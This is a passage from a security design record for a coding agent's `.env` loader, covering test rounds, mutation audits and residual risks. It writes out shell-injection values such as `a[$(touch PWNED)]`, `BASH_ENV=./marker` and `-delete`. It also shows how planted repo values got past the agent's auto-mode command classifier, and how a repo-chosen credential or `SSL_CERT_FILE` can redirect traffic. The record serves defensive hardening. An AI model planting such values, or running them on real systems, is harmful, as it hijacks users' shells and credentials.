  - A value naming `KSH_MATCH`, `EXECSHELL`, `TEXTDOMAIN`, `TEXTDOMAINDIR`, `ZSH_DEBUG_CMD`,
    `HISTORY_IGNORE`, `REPORTTIME`, `REPORTMEMORY`, `CORRECT_IGNORE` or `CORRECT_IGNORE_FILE` is
    refused. Over the 19 shapes × 200,000 values above, these ten refused none
    (`fix-r2/fp/fp3.txt`).
  - Live, in a pty TUI under auto with a scripted model and
    `OPENROUTER_BASE_URL=https://x.example/$(touch${IFS}PWNED)` hatched,
    `let "y=a[$OPENROUTER_BASE_URL]"` and `echo $(( a[$OPENROUTER_BASE_URL] ))` asked; approved,
    each created `PWNED` on `141b6430`. On the fix the line was refused with the notice above the
    banner, and the approved commands created nothing. A hatched
    `https://gw.example:8443/api/v1?org=acme&tier=2` and a key led by `-` loaded; a hatched-off
    `NPM_TOKEN` holding `a[$(touch PWNED)]` got the notice that names the hatch
    (`fix-r2/out/live-tui-*.txt`).
- Narrow-and-finish (the lead's call, not the owner's):
  - A hatched URL whose `[` or `]` is anything but an IPv6 host is refused with the notice: a
    `]` or `[` in the path, query or fragment, a second `]`, a bracketed host that is not hex
    digits, `:` and `.`, text after the host, or a bracket in userinfo. The 12 bracket rows of
    `test_a_hatched_non_credential_value_that_is_not_a_url_or_key_is_refused` loaded on
    `b95ed1b8`. `http://[::1]:8080/v1`, `https://user@[2001:db8::1]/api?x=1` and
    `http://[::ffff:127.0.0.1]/` still load (`test_a_hatched_url_flag_or_model_id_still_loads`).
  - It refuses an IPv6 zone id too, which now needs an export: httpx 0.28.1 on macOS reached a
    local server at `http://[fe80::1%lo0]:PORT/v1` (`url-ipv6-zone-id`).
  - Over the 51,490-value corpus under 7 names, the only change from `b95ed1b8` is 286 values
    refused under the two hatched non-credential names, each a `://` value holding a bracket.
    Nothing loads that `b95ed1b8` or `467f9a52` refused (`finish/out/only-raises.txt`).
  - Live, in a pty TUI under auto with a scripted model and `SHELL=/bin/zsh`, a hatched
    `https://x.example/]+(PATH=0)+m[x` loaded on `b95ed1b8`, and the approved
    `echo $(( a[$OPENROUTER_BASE_URL] )); ls` printed `0` and no listing and created
    `RAN_PLANTED_LS`.
    On the fix the line was refused with the notice above the banner, and the approved command
    printed `0` and the real `ls` listing and created nothing. A hatched `http://[::1]:8080/v1`
    loaded, and `echo "U=$OPENROUTER_BASE_URL"` printed it (`finish/out/live-tui-*.txt`).
- Fix round 1, each now loaded:
  - Credential values with `~`, `:` or `%`.
  - A NUL in a hatched value now gets the notice instead of `ValueError` at launch.
- Fix round 1: the dev helpers that start aelix (`scripts/diag_tui_live.py`, the aelix-live-check
  skill's `tui_capture.py`) now run a `.env` through `load_dotenv`. Before, their own parsers copied
  every line into the child, so `EVIL_API_KEY=a[$(touch PWNED)]` and `BASH_ENV=./marker` reached
  its `bash -c` (Codex). `tests/test_dev_helper_dotenv_756.py` pins both helpers.

**Residual, not closed by this rule.**
- (a) A loaded value can still NAME an ordinary variable, which the shell then evaluates. Every
  value a `.env` supplies is checked now: credentials, configuration, and since fix round 1 the
  names the hatch opens. So a variable another `.env` line supplies holds nothing that runs.
  - On `ced24970` this was open through the hatch. With `AELIX_DOTENV_ALLOW=OPENROUTER_BASE_URL`
    exported, a `.env` holding `OPENROUTER_BASE_URL=a[$(touch PWNED)]` and
    `EVIL_API_KEY=OPENROUTER_BASE_URL` loaded both, and `echo $((EVIL_API_KEY))` created `PWNED`
    in bash, macOS ksh93u+ and mksh. That breached this ADR's own floor criterion.
  - Now the first line is refused, and a URL there, read by name through `EVIL_API_KEY`, stops
    at its `:` (`test_a_credential_that_names_a_hatched_variable_carries_nothing`, both rows).
  - What remains: variables you exported yourself, and variables the command assigns, which are
    the classifier's to judge.
- (b) The shell also fills some variables from the command itself.
  - Fix round 1 refuses a value that names `_`, `REPLY`, `OPTARG`, `BASH_REMATCH`, ksh93's
    `.sh.match` or any other name in `_SHELL_OWN_NAMES`. It said the value side was closed. It
    was not: the round-2 verify found mksh's `KSH_MATCH`, which `[[ x = pattern ]]` and `case`
    fill. With `EVIL_API_KEY=KSH_MATCH` loaded, `[[ $(cat files/r) == *x* ]] && echo
    $((EVIL_API_KEY))` and the same through `case` ran the `$(…)` in `files/r` in mksh R59
    (`verify-r2/out/ksh_match-linux.txt`). Fix round 2 adds it and nine other names the verify
    found in the shell binaries (`EXECSHELL`, `TEXTDOMAIN`, `TEXTDOMAINDIR`, `ZSH_DEBUG_CMD`,
    `HISTORY_IGNORE`, `REPORTTIME`, `REPORTMEMORY`, `CORRECT_IGNORE`, `CORRECT_IGNORE_FILE`;
    the verify judged these to change behaviour only and did not test them further)
    (`test_exploit_a_ksh_match_value_never_reaches_what_a_pattern_matched_in_mksh`, which runs
    where `mksh` is installed).
  - `_SHELL_OWN_NAMES` is every upper-case name the 9 shells define under `env -i`, plus the
    names their manuals say they set on demand or read (`fix-r1/names/derive.py`), plus those
    ten. The round-2 verify found no other name defined under `env -i` in bash 5.3, mksh and zsh
    with its modules loaded. It is still a best-effort list: a shell release can add a name, so
    the value side is closed only as far as the list reaches.
  - Measured by the verify on `ced24970`: `UNDERSCORE_TOKEN=_` plus a repo file
    `files/z[$(touch PWNED_VIA_UNDERSCORE)]` made a real model under auto run
    `ls files/* >/dev/null; echo $((UNDERSCORE_TOKEN))` with no dialog, and the marker appeared
    (`verify-r1/out/live-real.txt`). In its grid, bash 3.2 and 5.2 ran it.
  - `0+REPLY` after `read REPLY < files/r` created `PWNED` in bash 3.2 and macOS ksh93u+.
    `0+.sh.match` after a ksh pattern match did so in ksh93u+.
  - Those are refused now (`test_exploit_an_underscore_value_never_reaches_a_repo_file_name_in_bash`,
    `test_exploit_a_reply_value_never_reaches_what_read_read_in_bash`).
  - Still open: the same reads with no `.env` at all. The classifier allows
    `ls files/*; echo $((_))` and `[[ … =~ .* ]] && echo $((BASH_REMATCH))` at `467f9a52`, and
    bash 3.2 and 5.2 ran both. That is a classifier gap this loader cannot close. A draft issue
    is in `.omc/probes/756/fix-r1/issue/`.
- (c) A loaded value can still change state without running anything.
  - On `ced24970`, `IFS++` set `IFS` to `1` in bash and ksh93u+. `OPTIND++` made `getopts` skip an
    option in bash, zsh and ksh (Codex). `CDPATH++`, `++CDPATH` and `--CDPATH` moved `cd src` into
    `1/src` in bash 3.2, bash 5.2 and mksh (the verify).
  - These name shell variables, so fix round 1 refuses them, also inside a longer value
    (`0+IFS++`, `~CDPATH++`).
  - An ordinary name can still be stepped (`x++`), and `1/0` or `1%0` still stops the command.
    Codex: with `1/0`, `echo $((X)); printf reached > REACHED` never reached the `printf`. With
    `1%0`, `echo $((X)); echo reached` stopped at a division by zero in macOS bash, zsh and ksh,
    and dash refused the value (`fix-r1/probe/mod-zero-mac.txt`).
  - `--` and `++` occur by chance in base64url and base64 keys, so they stay allowed.
- (d) Not every refused character is code on its own. A bare backtick or `{a,b}` value ran nothing,
  and whitespace alone only rewrites a test: `[ $X = y ]` with `x = x -o x` is true in bash, ksh
  and dash (`out/ws-backtick-mac.txt`). Each measured attack combines several of them, so
  `test_one_character_outside_the_key_formats_is_refused` pins each character on its own.
- (e) Options and paths. Codex measured `find victim $X` deleting `victim` with `X=-delete`, and
  `sh "$X"` running the repo's script with `X=./marker`. Both still load since fix round 2.
  - A bare relative name such as `marker` names a repo file to `sh "$X"` just the same: measured
    in bash 3.2 (`fix-r1/probe/codex4.jsonl`), and by the round-2 verify in all 9 shells through
    `$X`, `. $X` and `sh "$X"`. So the leading `.` was not what stood between a value and a repo
    file.
  - The classifier asks before `find … $X`, `sh "$X"`, `. $X` and `$X` (Codex, the round-2
    verify). It allows `cmd $X` and `cmd $X README.md` for 37 read-only commands, and the round-2
    verify ran those 37 with 37 values led by `-` or `.`, 2,590 runs in macOS bash (BSD tools)
    and 2,590 in Linux bash (GNU tools): nothing ran, was written or was deleted; only `tail -f`
    and `top` hung (`verify-r2/grid/lead-*.jsonl`). `echo $X` with `-n` only drops a newline.
  - A URL is a path too. In the narrow-and-finish grid the admitted `https://x.example/*`
    globbed to a repo file `https:/x.example/v1`, which `$X` and `. $X` ran in every shell
    measured but zsh, and which dash ran through `(( $X ))`, two nested subshells to it. The
    classifier asks before all three in every dialect (`finish/out/cls-finish.txt`).
  - So what remains: a key-shaped hatched value (`marker`, `./marker`, `-delete`) or a URL
    reaches `sh "$X"`, `find … $X`, `. $X`, `$X` and the like, which the classifier asks before.
    Forms and shells outside the measured grid are not measured.
- (f) The leading-character rule, fix round 1 to fix round 2. It was the lead's call in fix
  round 1, on the premise that no documented key format starts with `-` or `.`; Microsoft's Entra
  pattern page allows either first. With it, 3.228 % of 40-character Entra-alphabet values and
  1.603 % of unprefixed base64url keys were refused; without it, 0.262 % and 0.063 %, all for a
  shell name (`verify-r2/out/fp2.txt`). Fix round 2 dropped it on both arms, the credential arm
  (and with it the hatched values that are key-shaped) and the Cloudflare-id arm. That is the
  lead's call, not the owner's, on the measurement in (e).

**Tests.** First round: the admission file grew from 133 to 220 cases. The 58 new refusal rows
failed on `467f9a52` (the loader and this file are byte-identical at `6caaae09`):
- the 10 shell-code rows, the 29 one-character rows and the hatch, record, notice and
  trailing-comment rows with the value loaded;
- the 8 real-`bash` rows with `PWNED` created;
- the 6 line-break rows with both fragments loaded;
- the NUL row with `ValueError` (`out/base-run-final.txt`).

The 28 format rows and the 31-name test pass on base by design. Their mutation is a narrower set:
dropping `/`, `+`, `.` or both padding characters turns 2–3 of them red, and allowing one `=`
instead of two turns 1 red. Of the first round's 18 mutants, 16 were killed (`out/mutants.json`).
The verify found two more survivors: `{0,3}` and `=*`.

Fix round 1: the file has 302 cases (`fix-r1/out/`).
- 85 rows were added and 3 removed: the `~`, `:` and `%` one-character rows, which are allowed
  now.
- 56 of the new rows fail on `ced24970`:
  - with the value loaded: the 6 hatched-credential rows, the URL-on-a-credential-name row, 12 of
    the 13 hatched-value rows, 24 of the 25 shell-name and leading-character rows and the 4
    Cloudflare-id rows;
  - with the value refused: the Entra, Telegram and X format rows;
  - with `PWNED` created: the `_`, `REPLY`, chain and Cloudflare `_` rows;
  - with the notice printed: the exported-key row;
  - with `ValueError`: the hatched NUL row.
- The other 29 pass there by design, each pinning a mutant or a workflow:
  - padding (7): `{0,3}`, `=*`, an optional first character, a refused empty value;
  - whole-name matching (5);
  - the hatch's URL, flag and model-id values (6) and a key-shaped `NPM_TOKEN` (1);
  - the URL payloads in a real `bash -c` (7) and the admitted-URL chain (1);
  - `é` against a `\w` class (1);
  - `~CDPATH++` (1), which `ced24970` refused for its `~`.
- `tests/test_dev_helper_dotenv_756.py` (2 cases) fails on `ced24970` with the hostile values in
  the child's environment.
- 46 mutants of the new lines (the verify's 18, adapted, and 28 of this round's) killed 43
  (`fix-r1/mut/`, `fix-r1/mut2/`). The three survivors are equivalent:
  - `\Z` to `$`: a value never holds a newline, since the file is split into lines first;
  - a second `.strip(' ')`: the value is already stripped;
  - the suffix alone instead of `_dotenv_key_allowed(key) or` the suffix: every `ENV_API_KEYS`
    name ends in a suffix, measured.
- Re-measured on the 302-case file: deleting the `^AELIX_` alternation turns exactly one test red.
  The `ENV_API_KEYS` fallback, the hatch's `- _DOTENV_LOCKED` and the `_DOTENV_NEVER` substring
  alternation turn none red (`fix-r1/mutcited/`).

Fix round 2: the file has 341 cases (`fix-r2/out/`).
- 47 rows were added and 8 removed. The 8 are refusal rows whose values load now: 5 credential
  values and 2 hatched values led by `-` or `.`, and the Cloudflare `-delete` row; each reappears
  as a loading row. 23 rows moved with two renamed tests, whose names lost "or led by dash".
- 35 of the new rows fail on `141b6430` on macOS (bash 3.2), 38 in Linux docker (bash 5.2.37,
  mksh R59):
  - with the value loaded: the 8 `url-*` hatched-value rows and 12 shell-name rows (`KSH_MATCH`
    twice, the nine other names, and a Cloudflare id of `KSH_MATCH`);
  - with the value refused: 6 credential and 2 hatched values led by `-` or `.`, and 2 Cloudflare
    ids led by `-`;
  - with the old notice: the hatched-off `NPM_TOKEN` row;
  - with `PWNED` created through `let "y=a[$OPENROUTER_BASE_URL]"`: `url-cmdsub`, `url-brace` and
    `url-backtick-brace` on both systems, `url-procsub` in bash 3.2 and `url-squoted-cmdsub` in
    bash 5.2;
  - with `PWNED` created in mksh: the 3 `KSH_MATCH` rows (Linux only; they skip where no `mksh`
    is installed).
- The other new rows pass there by design: 4 real base URLs (a port with a query, IPv6, a
  `%`-encoded path and query, userinfo with a fragment), a scheme with no `//`, `.sh.match` at
  the start of a value (`141b6430` refused it for its `.`), `PWD`, and the inert
  `url-semicolon` payload.
- `tests/test_dev_helper_dotenv_756.py` gains a third case: an inherited `AELIX_DOTENV_ADMITTED`
  reaches the child with this `.env`'s names added. It passes on `141b6430`, whose helper already
  kept the record; it kills the verify's surviving mutant that copies only keys new to the
  environment.
- 59 mutants (`fix-r2/mut/`): the round-2 verify's 34 adapted to 33 (its two leading-character
  mutants became one that restores the rule), killing 32, and 26 of this round's on the delta
  (the URL tail's characters one by one, each new name, the notice order, the notices' reasons),
  killing 25. The two survivors:
  - a name token that must start with a letter or `_`, stricter than the rule: the round-2
    verify measured the digit-led tokens it would refuse (`1_`, `9REPLY`, `0xREPLY`, …) inert in
    10 shells, so it is left as is;
  - a URL tail of at least one character: equivalent, because `scheme://` with nothing after it
    is credential-shaped unless its scheme names a shell variable, which both rules refuse.
- Re-measured on the 341-case file: deleting the `^(AELIX|PI|…)_` alternation now turns two
  tests red, `test_repo_dotenv_cannot_set_control_plane[AELIX_FUTURE_API_KEY]` and
  `test_a_hatched_off_credential_name_gets_the_name_notice_whatever_its_value`, which reaches it
  through `NPM_TOKEN`'s `NPM_`; only the first pressures the `AELIX_` branch. The other three
  still turn none red (`fix-r2/mutcited/`).

Narrow-and-finish: the file has 358 cases (`finish/out/`).
- 17 rows were added: 12 bracket refusal rows, 2 IPv6 base URLs that load
  (`user@[2001:db8::1]` and `[::ffff:127.0.0.1]`), and 3 real-shell rows
  (`test_exploit_a_hatched_url_cannot_close_the_subscript_it_is_pasted_into`, in zsh, ksh and
  bash, each skipped where that shell is not installed).
- On `b95ed1b8` 14 of them fail on macOS and 15 in Linux docker (bash 5.2, zsh 5.9, ksh93u+m,
  mksh R59): the 12 refusal rows with the value loaded, and the real-shell rows with `PWNED`
  created, zsh and ksh on both systems and bash in Linux only (macOS bash 3.2 stops at the
  `://`). The 2 loading rows pass there by design; with the `[::1]:8080` row they pin the
  host's userinfo, `.` and port.
- 13 mutants of the new lines, all killed (`finish/mut/`): each bracket check dropped; the host
  class opened to anything, opened to a zone id, or without `.`; no lookahead after the host;
  userinfo dropped or opened to brackets; the port dropped; `search` for `match`; the host not
  skipped; the scheme check dropped.

pi has no cwd `.env` loader to compare: at `origin/main` `b2aabe029`, `git grep -i
"dotenv\|loadEnv\|'\.env'\|\"\.env\""` over `packages/coding-agent/src` and `packages/ai/src`
finds nothing. The same grep at `a05e3a077` (fix round 1), at `ffd3329bb` (fix round 2) and at
`e8ec20291` (narrow-and-finish) finds nothing either, so the hatch's value rule has no pi
counterpart to follow.

## Consequences

- `.env` is credentials-and-listed-config-only **in every directory**, trusted or
  not. Trust is deliberately not an input, because keying on it was measured to be
  a false green.
- Anything refused has a universal workaround: export it in your own shell.
- **Every model you could see before, you can still see.** Measured A/B at
  `is_runnable` with one `.env` supplying every catalog provider's variables:
  `0c9da7d` 847 runnable, this branch 847 runnable, per-provider diff over all 35
  providers **empty**. The intermediate 804 is what this ADR shipped for one
  round.
- **Vertex and both Cloudflare providers keep working from a `.env`.**
  `GOOGLE_CLOUD_PROJECT` / `GCLOUD_PROJECT` / `GOOGLE_CLOUD_LOCATION` load, so the
  ADC workflow (`gcloud auth application-default login` + project + location, no
  API key) is unchanged; `CLOUDFLARE_ACCOUNT_ID` / `CLOUDFLARE_GATEWAY_ID` load
  alongside `CLOUDFLARE_API_KEY`, so the 35 gateway + 8 Workers AI models stay
  visible. `GOOGLE_APPLICATION_CREDENTIALS` does not load, and the
  service-account-file variant needs an `export`. Both recipes and that refusal
  are in `.env.example`. The README states the six-name rule and names Vertex and
  Cloudflare; it does not enumerate `GOOGLE_APPLICATION_CREDENTIALS`, and an
  earlier draft of this bullet said it did. (**#362 amendment 2026-10-02,
  ADR-0250:** the arm admitted a sixth name, `OPENROUTER_DEFAULT_MODEL`, "bounded
  to model choice"; a model choice is a route choice, so it is now read from the
  shell only — five names remain, and the hatch still admits it by name: "shell
  only" means "unless you hatch it yourself" — with `AELIX_DOTENV_ALLOW=OPENROUTER_DEFAULT_MODEL`
  set in the user's shell, a cwd `.env` value picks the no-model route, which Codex's
  cross-review of the #362 commit measured and the main loop kept, ADR-0250 §2.6.)
- **Refused-and-disclosed, because the failure is confusing rather than loud.**
  TLS trust (`SSL_CERT_FILE`, `SSL_CERT_DIR`, `REQUESTS_CA_BUNDLE`,
  `CURL_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`) is refused and named in
  `.env.example`. It is not a cosmetic refusal: measured through the real stack
  (truststore injected as `entry.py` does it, then an `httpx.Client`),
  `SSL_CERT_FILE` takes the client's trust anchors from 120 CAs to whatever that
  one file holds — httpx reads the variable itself at `_config.py`
  (`ssl.create_default_context(cafile=os.environ["SSL_CERT_FILE"])`). A CA bundle
  a repo chooses is a trust store a repo chooses, which is strictly worse than
  chain 3, and no value-shape rule can help because the danger is that it is a
  path at all. aelix's own diagnostic already tells the corporate-proxy user to
  `export SSL_CERT_FILE=…` (`providers/_error_hints.py`), so the refusal and the
  documented remedy agree. SDK-level knobs the vendor libraries read for
  themselves (`OPENAI_ORG_ID`, `OPENAI_PROJECT_ID`,
  `ANTHROPIC_CUSTOM_HEADERS`, `AWS_REGION`, `AZURE_OPENAI_ENDPOINT`) are refused
  too and named in the same place; measured by grep over all three packages,
  aelix reads none of them anywhere — they belong to the vendor SDKs, and the
  only occurrences in our source are those two hint lines.
- Up to nine stderr notices per startup, one per outcome class (names only, never
  values, ANSI-sanitized — the key text is attacker-controlled and now reaches a
  terminal). Each admitted CLASS has its own line, because a single line labelled
  "credentials" would be a false label for two of the three: a GCP location and a
  Cloudflare account id are provider configuration, and a hatch-admitted
  `OPENROUTER_BASE_URL` is neither. If they ever become too chatty, the mitigation
  is once-per-directory state, not dropping them.
- `.env.example` no longer ships `OPENROUTER_BASE_URL`. It was byte-identical to
  the built-in default, so nobody who copied it verbatim sees a behaviour change.

### Evidence, and a correction to this ADR's own first draft

133 committed cases in `tests/cli/test_dotenv_admission.py`, audited against 46
source mutations applied to the shipped file and restored byte-exactly (md5
asserted each time): **132 of the 133 are RED under at least one mutation.** The
one that is not is `test_the_old_chain2b_assertion_was_vacuous`, which makes no
call into the loader at all — it compares two assertion FORMS against a path, and
exists to keep the reason a sibling test changed from going stale. Nothing a
mutation could do would move it, and that is stated here rather than papered over
with a number.

Four of the 46 mutations kill nothing, and each one is informative rather than a
gap in the tests:

| mutation | kills | what that means |
|---|---|---|
| delete `_DOTENV_NEVER`'s substring alternation | 0 | redundancy, not a guard — residual risk 4 |
| `_dotenv_key_allowed`'s `ENV_API_KEYS` fallback → `False` | 0 | confirms its own comment: redundant with the suffix rule for every name in the table today |
| `_dotenv_user_allowlist` stops subtracting `_DOTENV_LOCKED` | 0 | confirms defense-in-depth: `load_dotenv`'s locked branch runs before the hatch branch, so the subtraction is a second lock on the same door |
| read the hatch inside the loop instead of before it | 0 | confirms the comment at that line: `AELIX_DOTENV_ALLOW` never reaches `os.environ` for a late read to see |

Two guards are defended more than once over and needed a COMBINED mutation to
reach: `test_locked_keys_cannot_be_unlocked_by_the_escape_hatch[AELIX_DOTENV_ALLOW]`
only goes red with the admission rule, `_DOTENV_LOCKED` and the gate branch all
removed together. That is a property of the design, and the test's docstring
already says which guard it is really asserting.

That audit is the standard this ADR failed on its first pass, so it is recorded
rather than assumed — and the previous revision's "97 cases / 34 mutations /
every one RED" is superseded: the file grew to 133 while that sentence stood
still, which is the same drift this round was convened to remove.

The first draft cited "delete the membership check → 28 RED" as proof the headline
chain was guarded. `test_exploit_chain2b_repo_cannot_relocate_the_global_settings_file`
was counted in that number and was **not among those failures**. Its assertion —
`tmp_path not in resolved.parents and resolved.parent != tmp_path` — is vacuously
true for the one value a successful hijack produces, because `default_settings_path`
returns the override VERBATIM and a path is never in its own `.parents`. Worse, the
silent pass leaked the hijacked variable into the two sibling parametrizations
(`monkeypatch.delenv` records no undo for a key that was absent, while `load_dotenv`
writes `os.environ` directly), so those passed too. Measured under the identical
mutation, same source: old assertion **3 passed**, corrected assertion **3 failed**.
The chain2b cases now appear in that failure list (0 → 3 of 45).

Two more tests were found pinning nothing once `_DOTENV_LOCKED` grew: the
wildcard test and the "names the key, never the value" test both used names the
new locked branch refuses first, so the rules they are named for went untested.
Both were re-pointed at names only those rules can refuse.

### Residual risks

1. **Credential substitution survives by design, and precedence is not
   universal.** A repo `.env` may still supply a credential, and the correct
   statement of what your shell protects is three-part: a value you exported under
   the SAME name always wins (`setdefault`, name-scoped); for a provider aelix
   resolves itself, a shell-supplied key also wins over a DIFFERENT name from the
   file (the new provider-group guard); but programs aelix RUNS keep their own
   precedence. `gh` prefers `GH_TOKEN` over `GITHUB_TOKEN` (measured, gh 2.88.0),
   so a `.env` `GH_TOKEN` does outrank a `GITHUB_TOKEN` in your shell and can make
   the agent's `gh` act as an attacker's identity — disclosed by its own notice,
   remedied by exporting `GH_TOKEN` yourself. For provider keys, traffic goes to
   the *real* provider (base_url is refused) but under the attacker's account,
   where they can read the prompts. Bounded (no code execution, no config change,
   no trust bypass). The earlier bound "if the user has not exported one" was
   measured FALSE and is withdrawn. **Not executed. UNPROVEN.**

   The provider-group guard has a blind spot in the same class, named here rather
   than left for a later round: it iterates `ENV_API_KEYS`, so it says nothing
   about a credential name outside that table. `ANTHROPIC_AUTH_TOKEN` is admitted
   by the `_TOKEN` suffix, is not in the table, and the anthropic SDK reads it
   itself — measured at request build, with `api_key=None` and no aelix-supplied
   header, a `.env`-supplied `ANTHROPIC_AUTH_TOKEN` becomes the request's
   `Authorization: Bearer` header; with an explicit api_key, `x-api-key` carries
   the user's key instead, so the window is "aelix resolved no credential at
   all". Widening the guard past our own selection is what the "we change
   precedence only where we implement it" rule forbids, so this is disclosed, not
   patched. **2026-10-06 note (#374, ADR-0254):** the SDK no longer reads it. The anthropic
   adapter reads it itself for provider `anthropic` only, with no key and no auth header, so
   the window above stays for `anthropic` and closes for every other provider on the
   Anthropic API (a custom gateway, `fireworks`, `minimax`, …), which used to receive it. `GOOGLE_API_KEY` (admitted; the registered name is `GEMINI_API_KEY`)
   looks like the same shape; that one was **not** measured end-to-end and is not
   claimed.

   > **#362 amendment 2026-10-02 (ADR-0250).** A `.env` credential was also a
   > route SWITCH, not only a substituted key: with `ANTHROPIC_API_KEY` exported
   > and a repo `.env` carrying `OPENROUTER_API_KEY`, `--model
   > anthropic/claude-haiku-4-5` went to `openrouter.ai` under the file's key
   > (measured, `/tmp/362-work/design/live/today.out` A11) — the shell-wins
   > guarantee above was bypassed by routing around the provider it protects.
   > `load_dotenv` now records every name it admitted in `AELIX_DOTENV_ADMITTED`
   > (a `.env` cannot set it, even through the hatch; delegated children and a
   > nested `aelix` inherit it), and every judgement that CHOOSES a route counts
   > only credentials the user exported, stored with `/login` or wrote into
   > `models.json`. A `.env` credential still authenticates the route once
   > chosen: a user with **no** credential of their own for that route still
   > sends under the file's key — this risk exactly, narrowed from "can move a
   > route" to "can be the key of a route the user's flags chose". A `.env` key
   > that is not a plain environment name (`X,ANTHROPIC_API_KEY`) is now refused
   > outright, because the record is comma-joined.

   > **#362 amendment 2026-10-02 (ADR-0250 §2.2, Codex's third cross-review C3).**
   > A `.env`-admitted credential name no longer fills a base-URL placeholder.
   > `expand_base_url` filled any `{NAME}` from the environment, and the credential
   > rule admits a name by its suffix with no value-shape rule — so a user's own
   > models.json template `https://{TENANT_KEY}.owner-gateway.invalid/v1` plus a
   > repo `.env` `TENANT_KEY=repo-chosen.invalid/v1#` put the prompt and the repo's
   > key on host `repo-chosen.invalid` (measured on `5e983992`, real CLI: `CONNECT
   > repo-chosen.invalid:443`). This ADR gave value-shape rules exactly to the
   > configuration it admits for templates; a name the record holds now fills a
   > placeholder only when it is that configuration (`CLOUDFLARE_ACCOUNT_ID`,
   > `CLOUDFLARE_GATEWAY_ID`, below — `aelix_ai.dotenv_record.DOTENV_TEMPLATE_NAMES`),
   > and any other `.env` name leaves its token unexpanded: the model is not
   > runnable and the refusal says to export the variable. An exported value fills
   > every placeholder, as before. The catalogue's Cloudflare templates are
   > unaffected (measured: `CONNECT gateway.ai.cloudflare.com:443` on both).
2. **A repo-chosen GCP project or Cloudflare id is attribution and path, not
   host redirection.** `GOOGLE_CLOUD_PROJECT` never reaches the host — measured,
   it lands in the request path under a host fixed by the location, and the same
   shape rule removes path traversal. What a repo can still do is have the call
   attributed and billed to a project the user did not choose and, if the
   attacker owns a project with `allAuthenticatedUsers` bound to
   `roles/aiplatform.user`, put the prompt where they can read it. The Cloudflare
   ids are the same shape one level weaker: measured over 45 cases the host never
   moved, and `_CF_ID` blocks the path rewrites, so what survives is a repo
   choosing which Cloudflare account and gateway the call is attributed to and
   logged against. Both are the SAME CLASS as risk 1, accepted on the same terms:
   the project is inert alone (`_vertex_config_missing` requires project AND
   location), and the Cloudflare ids carry no credential of their own — either
   the key comes from the same `.env`, which is risk 1 exactly, or it is the
   user's, in which case a repo has chosen which account-and-gateway path on
   Cloudflare's own host the user's call is logged against.
3. **Naming discipline.** Anything later named `*_KEY`/`*_TOKEN` that is really a
   path becomes repo-settable unless `_DOTENV_NEVER` catches it. `^AELIX_`/`^PI_`
   covers our own future variables; a third-party one could slip. Mitigated by a
   committed coverage test over `ENV_API_KEYS`, and by the `AELIX_FUTURE_API_KEY`
   entry in `CONTROL_PLANE` — measured, deleting the `^AELIX_` alternation turns
   exactly one of the 133 admission tests red,
   `test_repo_dotenv_cannot_set_control_plane[AELIX_FUTURE_API_KEY]`, and before
   that entry existed it turned none. (A previous revision of this bullet, and
   the matching code comment, cited a standalone test by name; **no test of that
   name exists in the tree.** The coverage is the parametrized case.)
4. **`_DOTENV_NEVER`'s substring branch is blunt, and its refusals are untested.**
   `URL`/`PATH`/`DIR`/`HOME` match anywhere, so `VENDOR_URL_SIGNING_KEY` and
   `MY_HOME_API_KEY` are refused. Wrong direction, fails safe, still a support
   ticket. Measured this round: deleting that whole alternation turns **0 of 133**
   admission tests red. **That number measures the absence of tests, not
   redundancy** — do not read it as licence to delete the branch. Measured
   separately, the substring half UNIQUELY refuses `PROXY_PASSWORD`,
   `MY_HOME_API_KEY` and `VENDOR_URL_SIGNING_KEY`: all three end in a credential
   suffix, so plain default-deny does not reach them, and none is in
   `_DOTENV_LOCKED`. Deleting it is therefore fail-OPEN for that class. No test
   was invented to cover it because the names it uniquely refuses are the
   false-refusal class above, and pinning those would pin a defect — which is
   exactly why the measurement comes back zero. The prefix half
   (`^(AELIX|PI|PYTHON|LD|BASH|NODE|PERL|RUBY|GIT|SSH|NPM|npm)_` — twelve, not
   the two this bullet used to name) uniquely refuses `NPM_TOKEN`,
   `NODE_AUTH_TOKEN`, `GIT_TOKEN` and `SSH_KEY`, and it does have a test.
5. **`_DOTENV_LOCKED` is a floor, not a proof.** Unlike the admission rule it is
   not complete by construction — it is a hand-maintained list under a user-typed
   opt-in. The criterion above is the thing to maintain; the list will lag it.
6. **Scope is the `.env` vector, not the class.** `direnv`'s `.envrc`, a
   repo-supplied VS Code `launch.json`, or a dotfiles-dropped shell rc all set
   environment variables before `main_sync` and re-open every chain unchanged.
   `.env` is the loudest door, not the only one.
7. **The visibility criterion is guarded on one half, not both.**
   `test_every_templated_base_url_token_is_admissible` makes half (a) mechanical,
   so a catalog provider added with a templated base URL cannot silently vanish.
   Half (b) — a new `runnable_models` config guard reading a new env var — has no
   such test, because there is nothing to enumerate over. Concrete and measured
   today: `amazon-bedrock` (84 models) and `azure-openai-responses` (42) sit at 0
   runnable on **both** legs only because their APIs have no registered adapter.
   The day either lands, `AWS_ACCESS_KEY_ID`, `AWS_REGION`,
   `AZURE_OPENAI_ENDPOINT` and `AZURE_OPENAI_API_VERSION` are all refused today
   (measured) and would become the next regression of exactly this shape — note
   `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN` **are** admitted, so the pair
   splits down the middle the same way `CLOUDFLARE_API_KEY` did. Whoever
   registers that adapter owns re-applying the criterion.
8. **A count-based sweep is blind to variables a provider needs to WORK rather
   than to be SEEN.** The regression above was found by counting runnable models;
   nothing about that method can see `SSL_CERT_FILE`, `OPENAI_ORG_ID` or
   `ANTHROPIC_AUTH_TOKEN`, whose refusal or admission leaves the count identical.
   They were found by asking what the vendor clients read rather than how many
   models survive, and each is handled above (refuse-and-disclose,
   refuse-and-disclose, disclose). Any future audit of this arm needs both
   questions; the count one alone is what let this round start with two open
   findings instead of one.

## §3 — What this makes true that was not

Every "GLOBAL scope only" security read — `get_default_project_trust`,
`get_features_agents` — is only global-scope-only if the **path** to the global
file is out of the repo's reach. Four env vars decide that path:
`AELIX_SETTINGS_PATH`, `XDG_CONFIG_HOME`, `HOME`, `AELIX_CODING_AGENT_DIR`. Two
were proved live doors end-to-end. All four are now refused **and** locked against
the escape hatch.

So a global-scope-only setting **is** repo-proof after this change, and was **not**
before it. The docstrings asserting that property have been corrected to name the
precondition and cross-reference `_DOTENV_LOCKED` by name, so that the next person
to touch either half finds the other.

State that generally, because it is the reusable half: **a global-scope-only
SETTING is repo-proof only because `_DOTENV_LOCKED` also owns the path to the
global file.** The "GLOBAL scope only" read is one of two halves; on its own it
stops a repo's `.aelix/settings.json` and nothing else. Any future setting that
leans on that guarantee — as `get_default_project_trust` and `get_features_agents`
